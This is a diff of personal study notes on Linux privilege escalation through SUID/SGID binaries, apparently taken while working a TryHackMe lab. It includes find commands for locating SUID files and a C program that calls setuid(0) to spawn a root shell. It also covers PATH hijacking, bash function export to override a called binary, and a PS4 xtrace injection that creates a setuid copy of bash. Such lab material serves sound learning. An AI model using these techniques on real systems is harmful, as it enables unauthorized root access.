@@ -1,5 +1,25 @@
 
+The file is run with the permissions of it's user/group
+
+SUID = Set User ID
+SGID = Set Group ID
+
+### Find them
+
+	Find SUID binaries
+		`find / -perm -u=s -type f 2>/dev/null`
+	Find SGID binaries
+		`find / -perm -g=s -type f 2>/dev/null`
+	Both - test this one more
+		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
+find suids, from thm room - test 
+`find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null`
+
+Look in https://gtfobins.github.io/ and google
+
 ### Shared Object Injection
+
 https://tryhackme.com/r/room/linuxprivesc Task 12
 If we have suid root perms on a file that req a library that we can "modify", path "fix"
 
@@ -20,21 +40,55 @@ void inject() {
 
 `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
 
+### Environment Variables
 
+https://tryhackme.com/r/room/linuxprivesc Task 13
+
+we run the executable we have suid/sgid on to see what it does
+we run strings on it to see if it calls/runs something - looking for paths
+
+we can use that the executable is inheriting the user's PATH environment variable and not using a full path
+
+replace called executable with our own
+
+```c
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+`gcc -o executable-name our-code.c`
+
+run the suid/sgid binary after setting the path to the place where our file is (current dir in example)
+
+`PATH=.:$PATH /usr/local/bin/the-suid-sgid-binary`
+
+### Abusing Shell Features (#1)
+
+If bash is older than 4.2-048, functions can be made with names that are the exact same as actual paths:
+
+```sh
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+export -f makes the function available to following commands and executables
+
+run the SUID/SGID executable calling the path we replaced
+
+### Abusing Shell Features (#2)
+
+In bash older than 4.4 we can use the debug mode, replacing the default "+ " at the start of the debug lines with our own "text"
+
+`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/mybash; chmod +xs /tmp/mybash)' /usr/local/bin/the-suid-sgid-binary`
+	`env -i` clears the environment before adding the new vars
+	`PS4` stans for "Prompt String 4"
 
 
 
 
 ---
 
-	Find SUID binaries
-		`find / -perm -u=s -type f 2>/dev/null`
-	Find SGID binaries
-		`find / -perm -g=s -type f 2>/dev/null`
-	Both - test this one more
-		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
-
----
 
 thm:
 
